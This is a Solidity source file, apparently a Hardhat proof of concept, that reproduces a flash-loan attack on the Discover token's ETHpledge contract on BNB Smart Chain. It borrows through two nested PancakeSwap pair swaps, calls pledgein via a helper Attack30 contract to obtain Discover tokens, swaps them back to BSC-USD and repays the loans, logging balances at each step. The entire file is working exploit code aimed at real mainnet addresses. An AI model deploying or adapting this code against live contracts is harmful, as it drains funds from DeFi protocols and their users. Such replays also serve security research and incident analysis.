// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "../interface.sol";
import "./Attack30.sol";
import "hardhat/console.sol";
import "../utils.sol";



contract Attack79 {
    using SafeMath for uint;

    //用到的地址
    address public constant BSC_USD_ADDR = 0x55d398326f99059fF775485246999027B3197955; // Binance-Peg BSC-USD (BSC-USD)
    address public constant DISCOVER_ADDR = 0x5908E4650bA07a9cf9ef9FD55854D4e1b700A267; // Discover合约
    address public constant WBNB_ADDR = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c; // WBNB
    address public constant ETH_PLEDGE_ADDR = 0xe732a7bD6706CBD6834B300D7c56a8D2096723A7; // ETHpledge
    address public constant PANCAKE_ROUTER2_ADDR = 0x10ED43C718714eb63d5aA57B78B54704E256024E; // pancakeRouter2
    address public constant PAIR_DISCOVER_BSC_USD_ADDR = 0x92f961B6bb19D35eedc1e174693aAbA85Ad2425d; // PancakeSwap: Discover-BSC-USD
    address public constant PAIR_BUSD_BSC_USD_ADDR = 0x7EFaEf62fDdCCa950418312c6C91Aef321375A00; // pancakecall BUSD-BSC-USD
    address public constant ATTACKER_ADDR = 0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266; // 攻击者钱包

    //utils
    uint8 public flag = 1;
    uint256 public decimal = 10 ** 18;

    //声明合约实例
    Attack30 private attack30;
    IPancakePair private busd_BscUsd_Pair;
    IPancakePair private discover_BscUsd_Pair;
    IERC20 private bsc_Usd;
    IETHpledge private ethPledge;
    IERC20 private discover;
    IPancakeRouter private pancakeRouter;

    //构造函数创建合约实例
    constructor(address attack30Addr) {
        attack30 = Attack30(attack30Addr);
        busd_BscUsd_Pair = IPancakePair(PAIR_BUSD_BSC_USD_ADDR);
        discover_BscUsd_Pair = IPancakePair(PAIR_DISCOVER_BSC_USD_ADDR);
        bsc_Usd = IERC20(BSC_USD_ADDR);
        ethPledge = IETHpledge(ETH_PLEDGE_ADDR);
        discover = IERC20(DISCOVER_ADDR);
        pancakeRouter = IPancakeRouter(payable(PANCAKE_ROUTER2_ADDR));
    }

    function attackBegin() public payable {
        console.log("=============Attack start=============");
        console.log("attack79 balance of bsc_Usd:", bsc_Usd.balanceOf(address(this)) / decimal);
        console.log("ethPledge balance of discover:", discover.balanceOf(address(ethPledge)) / decimal);

        bytes memory data = abi.encode(PAIR_BUSD_BSC_USD_ADDR, address(attack30));

        console.log("=============First execute FlashLoan with busd_BscUsd_Pair=============");

        busd_BscUsd_Pair.swap(2100000000000000000000, 0, address(this), data);
    }

    function pancakeCall(address _sender, uint256 _amount0, uint256 _amount1, bytes memory _data) public payable {
        if (flag == 1) {
            console.log("=============First execute pancakeCall=============");
            console.log("bsc_Usd balance of attack79 in first swap:", bsc_Usd.balanceOf(address(this)) / decimal);

            flag++;
            bytes memory data = abi.encode(PAIR_DISCOVER_BSC_USD_ADDR, address(attack30));

            console.log("=============Second execute FlashLoan with discover_BscUsd_Pair=============");

            discover_BscUsd_Pair.swap(19810777285664651588959, 0, address(this), data);


            console.log("=============Attack79 change discover to bsc_usd=============");

            discover.approve(address(pancakeRouter), type(uint256).max);

            address[] memory path = new address[](2);
            path[0] = address(discover);
            path[1] = address(bsc_Usd);
            pancakeRouter.swapExactTokensForTokensSupportingFeeOnTransferTokens(discover.balanceOf(address(this)), 1, path, address(this), block.timestamp + 100);

            console.log("bsc_Usd balance of attack79 after change discover to bsc_usd:", bsc_Usd.balanceOf(address(this)) / decimal);
            console.log("==========repair bsc_usd to busd_BscUsd_Pair(first flashLoan)===========");

            bsc_Usd.transfer(PAIR_BUSD_BSC_USD_ADDR, 2106000000000000000000);

            console.log("after repair,the balance of bsc_usd in busd_BscUsd_Pair:", bsc_Usd.balanceOf(address(busd_BscUsd_Pair)) / decimal);

            console.log("=============Attack END=============");
            console.log("attack79 balance of bsc_Usd:", bsc_Usd.balanceOf(address(this)) / decimal);
            console.log("ethPledge balance of discover:", discover.balanceOf(address(ethPledge)) / decimal);


        } else if (flag == 2) {
            console.log("=============Second execute pancakeCall=============");
            console.log("bsc_Usd balance of attack79 in second swap:", bsc_Usd.balanceOf(address(this)) / decimal);
            console.log("=============Attack79 transfer busd to ETHPlege then ETHplege transfer discover to attack30=============");

            bsc_Usd.approve(ETH_PLEDGE_ADDR, 2000 * decimal);
            ethPledge.pledgein(address(attack30), 2000 * decimal);

            console.log("Discover balance of attack30 in second swap(62536?):", discover.balanceOf(address(attack30)) / decimal);
            console.log("=============Attack79 call Attack30 attack function=============");

            attack30.attack(address(this));

            console.log("Discover balance of attack79 in second swap:", discover.balanceOf(address(this)) / decimal);
            console.log("==========repair bsc_usd to discover_BscUsd_Pair(second flashLoan)===========");
            console.log("before repair,the balance of bsc_usd in discover_BscUsd_Pair:", bsc_Usd.balanceOf(address(discover_BscUsd_Pair)) / decimal);

            bsc_Usd.transfer(PAIR_DISCOVER_BSC_USD_ADDR, 19870209617521645543725);

            console.log("after repair,the balance of bsc_usd in discover_BscUsd_Pair:", bsc_Usd.balanceOf(address(discover_BscUsd_Pair)) / decimal);
        }
    }


}


interface IETHpledge {
    function pledgein(address to, uint256 amount) external;
}

